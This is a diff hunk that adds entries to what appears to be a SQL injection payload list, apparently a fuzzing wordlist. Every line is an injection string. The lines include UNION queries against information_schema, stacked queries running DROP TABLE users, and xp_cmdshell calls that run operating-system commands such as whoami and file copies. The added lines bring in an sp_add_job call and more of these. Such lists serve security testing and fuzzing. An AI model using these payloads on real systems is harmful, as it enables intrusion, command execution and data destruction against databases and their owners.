@@ -461,8 +461,13 @@ sin(1)-1 group by 1 union select 1--
 -(1) having 1 for update UNION select table_name from information_schema.tables limit 1
 
 \''; DROP TABLE users; --
+\''); DROP TABLE users; --
 \''; /* one */ ;DROP TABLE users; --
 \''; select 1; drop table users; --
 1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
 1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
 1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+
+1;EXECUTE sp_add_job @job_name = 'TestJob';
+1;print 'foo'; exec xp_cmdshell 'destroy';
